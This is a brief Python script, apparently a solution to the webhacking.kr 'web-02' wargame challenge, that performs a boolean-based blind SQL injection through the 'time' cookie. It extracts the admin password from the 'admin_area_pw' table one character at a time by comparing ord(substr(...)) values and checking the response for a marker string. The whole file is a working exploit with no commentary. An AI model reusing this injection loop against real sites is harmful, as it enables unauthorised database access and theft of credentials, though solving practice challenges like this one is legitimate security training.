	
import requests
 
url ="https://webhacking.kr/challenge/web-02/"
ck = ""
db = ""
table = ""
columns = ""
pw = ""
 
for i in range(1,100):
    if ck ==1:
        break
    for k in range(33,133):
        cookies={"Cookie" : "PHPSESSID=1644479083; time=0 ||"
                            " if(ord(substr((select pw from admin_area_pw),{},1))={},1,0)".format(i,k)}
        r =requests.get(url,cookies=cookies)
        if r.text.find("09:00:01") != -1:
            pw+=chr(k)
            break
        if k == 132:
            ck =1
print("Password : {}".format(pw))